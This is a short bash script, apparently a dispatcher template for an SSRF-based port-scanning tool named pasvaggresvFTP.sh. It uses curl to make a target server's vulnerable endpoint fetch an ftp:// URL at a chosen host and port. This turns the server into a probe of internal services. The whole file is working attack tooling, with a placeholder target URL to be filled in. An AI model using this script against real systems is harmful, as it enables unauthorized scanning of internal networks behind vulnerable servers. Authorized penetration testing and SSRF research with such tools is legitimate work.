#!/bin/bash

#dispatcher template for port scanning with pasvaggresvFTP.sh

host=${1:-127.0.0.1}
port=${2:-2121}


#CHANGE THE FOLLOWING LINE.
#The target server should be triggered to download the following url: "ftp://${host}:${port}/"
#the variables ${host} and ${port} will be populated by the script at runtime!
curl "https://target/ssrf_vulnerability" -G --data-urlencode "url=ftp://${host}:${port}/"